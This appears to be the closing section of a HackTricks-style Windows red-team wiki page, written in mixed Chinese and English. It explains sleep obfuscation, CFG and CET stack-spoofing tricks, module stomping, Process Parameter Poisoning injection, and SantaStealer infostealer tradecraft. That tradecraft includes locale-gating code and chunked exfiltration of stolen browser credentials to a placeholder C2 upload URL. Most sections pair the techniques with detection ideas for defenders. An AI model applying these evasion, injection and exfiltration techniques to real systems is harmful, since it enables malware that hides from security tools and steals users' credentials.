- 使用 `CreateTimerQueueTimer` 安排一系列 callbacks，通过构造的 `CONTEXT` frames 调用 `NtContinue`。
- 典型 chain（x64）：将 image 设置为 `PAGE_READWRITE` → 通过 `advapi32!SystemFunction032` 对完整 mapped image 执行 RC4 encrypt → 执行 blocking wait → RC4 decrypt → 遍历 PE sections **恢复各 section 的 permissions** → signal completion。
- `RtlCaptureContext` 提供 template `CONTEXT`；将其 clone 到多个 frames，并设置 registers（`Rip/Rcx/Rdx/R8/R9`）以调用各个步骤。

Operational detail：对较长的 waits 返回“success”（例如 `WAIT_OBJECT_0`），使 caller 在 image 被 masking 时继续执行。这种 pattern 会在 idle windows 期间隐藏 module，且避免经典的“patched `Sleep()`” signature。

Detection ideas (telemetry-based)
- 指向 `NtContinue` 的 `CreateTimerQueueTimer` callbacks bursts。
- `advapi32!SystemFunction032` 被用于大型、连续且接近 image 大小的 buffers。
- 大范围 `VirtualProtect`，之后执行 custom per-section permission restoration。

### Runtime CFG registration for sleep-obfuscation gadgets

在启用 CFG 的 targets 上，首次间接跳转到 `jmp [rbx]` 或 `jmp rdi` 等 mid-function gadget 时，通常会因该 gadget 不存在于 module 的 CFG metadata 中而使 process 以 `STATUS_STACK_BUFFER_OVERRUN` 崩溃。要让 Ekko/Kraken-style chains 在 hardened processes 内保持运行：<sup>[[30]](#references)</sup>

- 使用 `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` 注册 chain 使用的每个 indirect destination，并提供 `CFG_CALL_TARGET_VALID` entries。
- 对于 loaded images（`ntdll`、`kernel32`、`advapi32`）中的 addresses，`MEMORY_RANGE_ENTRY` 必须从 **image base** 开始，并覆盖 **完整 image size**。
- 对于 manually mapped/PIC/stomped regions，则使用 **allocation base** 和 allocation size。
- 不仅要标记 dispatch gadget，还要标记间接到达的 exports（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscalls），以及将成为 indirect targets 的任何 attacker-controlled executable sections。

这会将 ROP/JOP-style sleep chains 从“仅在 non-CFG processes 中工作”转变为可用于 `explorer.exe`、browsers、`svchost.exe` 以及其他使用 `/guard:cf` 编译的 endpoints 的 reusable primitive。

### CET-safe stack spoofing for sleeping threads

完整的 `CONTEXT` replacement 具有较高噪声，并且可能在 CET Shadow Stack systems 上失效，因为 spoofed `Rip` 仍必须与 hardware shadow stack 一致。更安全的 sleep-masking pattern 是：<sup>[[30]](#references)</sup>

- 选择同一 process 中的另一个 thread，并通过 `NtQueryInformationThread` 读取其 `NT_TIB` / TEB stack bounds（`StackBase`、`StackLimit`）。
- Backup 当前 thread 的真实 TEB/TIB。
- 使用 `GetThreadContext` capture 真实 sleeping context。
- 仅将真实 `Rip` 复制到 spoof context，保留 spoofed `Rsp`/stack state 不变。
- 在 sleep window 期间，将 spoof thread 的 `NT_TIB` 复制到当前 TEB，使 stack walkers 在 legitimate stack range 内进行 unwind。
- wait 完成后，restore 原始 TIB 和 thread context。

这样可以保留与 CET 一致的 instruction pointer，同时误导依赖 TEB stack metadata 验证 unwinds 的 EDR stack walkers。

### APC-based alternative: Kraken Mask

如果 timer-queue dispatch 的 signature 过于明显，则可以通过 suspended helper thread 使用 queued APCs 执行相同的 sleep-encrypt-spoof-restore sequence：<sup>[[27]](#references)</sup>

- 创建一个以 `NtTestAlert` 为 entrypoint 的 helper thread。
- 使用 `NtQueueApcThread` queue prepared `CONTEXT` frames/APCs，并通过 `NtAlertResumeThread` drain 它们。
- 将 chain state 存储在 heap 而不是 helper stack 中，以避免耗尽默认的 64 KB thread stack。
- 使用 `NtSignalAndWaitForSingleObject` 原子地 signal start event 并进入 block。
- 在 restore TIB/context 前 suspend main thread（`NtSuspendThread` → restore → `NtResumeThread`），以缩小 scanner 捕获 half-restored stack 的 race window。

这种方式将 `CreateTimerQueueTimer` + `NtContinue` signature 替换为 helper-thread/APC signature，同时保留相同的 RC4 masking 和 stack-spoofing goals。

Additional detection ideas
- 在 sleeps、waits 或 APC dispatch 之前不久调用 `NtSetInformationVirtualMemory`，并使用 `VmCfgCallTargetInformation`。
- 在 `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject` 或 `ConnectNamedPipe` 周围调用 `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` 后直接写入当前 thread 的 TEB/TIB stack bounds。
- `NtQueueApcThread`/`NtAlertResumeThread` chains 间接到达 `SystemFunction032`、`VirtualProtect` 或 section-permission restoration helpers。
- 在 signed modules 内反复使用 `FF 23`（`jmp [rbx]`）或 `FF E7`（`jmp rdi`）等短 gadget signatures 作为 dispatch pivots。


## Precision Module Stomping

Module stomping 从 target process 中已经映射的 DLL 的 **`.text` section** 执行 payload，而不是分配明显的 private executable memory 或加载新的 sacrificial DLL。overwrite target 应为一个 **已加载、由 disk-backed 的 image**，其 code space 能够容纳 payload，同时不会破坏 process 仍需使用的 code paths。<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

针对 `uxtheme.dll` 或 `comctl32.dll` 等 common modules 进行 naive stomping 很脆弱：DLL 可能未加载到 remote process 中，过小的 code region 也会导致 process crash。更可靠的 workflow 是：

1. Enumerate target process modules，并保留一个已经 loaded DLL 的 **names-only include list**。
2. 先 build payload 并记录其 **exact byte size**。
3. 扫描磁盘上的 candidate DLLs，并将 PE section **`.text` `Misc_VirtualSize`** 与 payload size 进行比较。这一点比 file size 更重要，因为它反映了 executable section **映射到 memory 时的大小**。
4. 解析 **Export Address Table (EAT)**，并选择一个 exported function RVA 作为 stomp start offset。
5. 计算 **blast radius**：如果 payload 超过选定 function boundary，就会覆盖 memory 中位于其后的相邻 exports。

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
操作说明
- 优先使用远程进程中**已经加载**的 DLL，以避免 `LoadLibrary`/unexpected image loads 产生的 telemetry。
- 优先选择目标应用很少执行的 exports，否则正常代码路径可能在线程创建前后命中被 stomp 的字节。
- 较大的 implants 通常需要将 shellcode 的嵌入方式从字符串字面量改为 **byte-array/braced initializer**，以确保整个 buffer 在 injector 源代码中得到正确表示。

检测思路
- 向 **image-backed executable pages**（`MEM_IMAGE`、`PAGE_EXECUTE*`）执行 remote writes，而不是写入更常见的 private RWX/RX allocations。
- 内存中的 export entry points 与磁盘上 backing file 的内容不再匹配。
- Remote threads 或 context pivots 从合法 DLL export 内开始执行，且其前几个字节最近被修改过。
- 针对 DLL `.text` pages 执行可疑的 `VirtualProtect(Ex)` / `WriteProcessMemory` 操作序列，随后创建线程。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) 是一种 **process-injection / EDR-evasion** 技术，可避免经典的 remote write path（`VirtualAllocEx` + `WriteProcessMemory`）。它并不将字节复制到已经运行的目标进程中，而是利用 Windows 会将选定的 `CreateProcessW` startup parameters **复制到子进程中**这一事实，并将其存储在 `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内。<sup>[[28]](#references)[[29]](#references)</sup>

### 可由 `CreateProcessW` 复制的 Poisonable carriers

有用的 carriers 包括：

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（使用 `CREATE_UNICODE_ENVIRONMENT`）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

实际 carrier 限制：

- `lpCommandLine` 必须指向 `CreateProcessW` 可写的内存，并且上限为 **32,767 个 Unicode 字符**，包括 null terminator。
- `lpEnvironment` 必须是由连续的 `NAME=VALUE\0` 字符串组成的 Unicode environment block，并以额外的 `\0` 终止。
- `lpReserved` 在官方定义中是保留字段，因此应将 `ShellInfo` mapping 视为实现细节，而不是稳定的 documented contract。

这会将正常的进程创建转变为 **payload-transfer primitive**。operator 使用 attacker-controlled startup data 创建子进程，并让 Windows 执行跨进程复制。

### 不使用 remote write APIs 的 Remote lookup flow

子进程创建后，使用 **read-only** primitives 解析复制的 buffer：

1. `NtQueryInformationProcess(ProcessBasicInformation)` → 获取 `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. 读取 remote `PEB`
3. 跟随 `PEB.ProcessParameters`
4. 读取 `RTL_USER_PROCESS_PARAMETERS`
5. 使用选定的 pointer：
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

最小流程：
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### 执行复制的参数缓冲区

复制的参数区域通常是 `RW`，不可执行。常见的 P3 chain 是：

1. 正常创建进程（不使用 suspended）
2. 使用 `NtProtectVirtualMemory` / `VirtualProtectEx` 将选定的参数页设为可执行
3. 复用 `PROCESS_INFORMATION` 中已返回的 main thread handle
4. 使用 `NtSetContextThread`（`CONTEXT_CONTROL`，覆盖 `RIP`）重定向执行

不同于经典的 thread hijacking workflow，这不需要 `SuspendThread` / `ResumeThread`；可以直接通过返回的 main thread handle 修改 context。

这避开了多个通常会被监控的 injection API：

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 通常也包括 `SuspendThread` / `ResumeThread`

### Null-byte 限制与 staged shellcode

这三个 carrier 都是**字符串或类似字符串的数据**，因此包含 `0x00` 的 raw payload 会在传输过程中被截断。一种实用的 workaround 是使用能够在运行时重建 constants、然后加载任意 second stage 的 **null-free first stage**。

一种简单的模式是基于 XOR 的 constant synthesis：
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
这使第一阶段能够构造 stack strings、API arguments、DLL paths 或 second-stage shellcode loader，而无需在传输的参数中嵌入 null bytes。

### 第一阶段基于 stack 的 API 调用

当第一阶段必须调用 `LoadLibraryA` 等 API 时，可以：

- 将字符串/buffer push 到目标 stack 上
- 预留 **32-byte x64 shadow space**
- 将 `RCX`、`RDX`、`R8`、`R9` 设置为常量或相对于 `RSP` 的指针
- 在调用前保持 `RSP` **16-byte 对齐**

随后，second stage 可以从 stack 复制到 `PAGE_READWRITE` allocation 中，通过 `VirtualProtect` 将其切换为 `PAGE_EXECUTE_READ`，然后跳转执行，从而避免直接分配 RWX 内存。

### Detection ideas

作者提到的良好 hunting 机会：

- `VirtualProtectEx` / `NtProtectVirtualMemory` 将 **process-parameter pages 设置为 executable**
- 随后的 protection change 伴随 `SetThreadContext` / `NtSetContextThread`
- 远程读取 `PEB`，随后读取 `RTL_USER_PROCESS_PARAMETERS`
- 创建进程期间，`lpCommandLine`、`lpEnvironment` 或 `STARTUPINFO.lpReserved` 的值异常冗长或具有高 entropy

### Notes

- P3 是一种 **cross-process transfer trick**，本身并不是完整的 execution primitive：复制后的参数仍需要 execute-permission change 以及 execution redirection method。
- 作者曾考虑 `RtlCreateProcessReflection` / Dirty Vanity，但最终放弃，因为它在内部会调用 `NtWriteVirtualMemory` 和 `NtCreateThreadEx` 等可疑 primitives。

## SantaStealer 用于 Fileless Evasion 和 Credential Theft 的 Tradecraft

SantaStealer（又名 BluelineStealer）展示了现代 info-stealers 如何在单一 workflow 中结合 AV bypass、anti-analysis 和 credential access。<sup>[[24]](#references)</sup>

### Keyboard layout gating 和 sandbox delay

- 一个 config flag（`anti_cis`）通过 `GetKeyboardLayoutList` 枚举已安装的 keyboard layouts。如果发现 Cyrillic layout，该 sample 会创建一个空的 `CIS` marker，然后在运行 stealers 前终止，从而确保它不会在被排除的 locales 上 detonate，同时留下一个 hunting artifact。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 分层的 `check_antivm` 逻辑

- Variant A 遍历进程列表，使用自定义滚动校验和对每个名称进行哈希处理，并将其与内置的 debugger/sandbox blocklist 进行比较；随后对 computer name 重复执行校验和计算，并检查 `C:\analysis` 等工作目录。
- Variant B 检查系统属性（进程数量下限、最近的 uptime），调用 `OpenServiceA("VBoxGuest")` 检测 VirtualBox additions，并围绕 sleep 执行 timing checks，以发现 single-stepping。任何命中都会在 modules 启动前中止执行。

### 无文件 helper + 双重 ChaCha20 reflective loading

- 主 DLL/EXE 内嵌了一个 Chromium credential helper，该 helper 要么被释放到磁盘，要么被手动映射到内存中；fileless mode 会自行解析 imports/relocations，因此不会写入任何 helper artifacts。
- 该 helper 使用 ChaCha20 对第二阶段 DLL 进行两次加密（两个 32 字节密钥 + 12 字节 nonce）。完成两次处理后，它会对 blob 执行 reflective loading（不使用 `LoadLibrary`），并调用源自 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 的 exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`。<sup>[[25]](#references)</sup>
- ChromElevator routines 使用 direct-syscall reflective process hollowing 将 payload 注入正在运行的 Chromium browser，继承 AppBound Encryption keys，并直接从 SQLite databases 中解密 passwords/cookies/credit cards，尽管存在 ABE hardening。


### 模块化内存 collection 与分块 HTTP exfil

- `create_memory_based_log` 遍历全局 `memory_generators` function-pointer table，并为每个启用的 module（Telegram、Discord、Steam、screenshots、documents、browser extensions 等）创建一个 thread。每个 thread 将结果写入 shared buffers，并在约 45 秒的 join window 后报告其 file count。
- 完成后，所有内容都会使用静态链接的 `miniz` library 压缩为 `%TEMP%\\Log.zip`。随后 `ThreadPayload1` sleep 15 秒，并通过 HTTP POST 将 archive 以 10 MB chunks 流式发送到 `http://<C2>:6767/upload`，同时伪装 browser 的 `multipart/form-data` boundary（`----WebKitFormBoundary***`）。每个 chunk 都会添加 `User-Agent: upload`、`auth: <build_id>`，以及可选的 `w: <campaign_tag>`；最后一个 chunk 会追加 `complete: true`，以便 C2 知道 reassembly 已完成。

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [16] [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)

{{#include ../banners/hacktricks-training.md}}
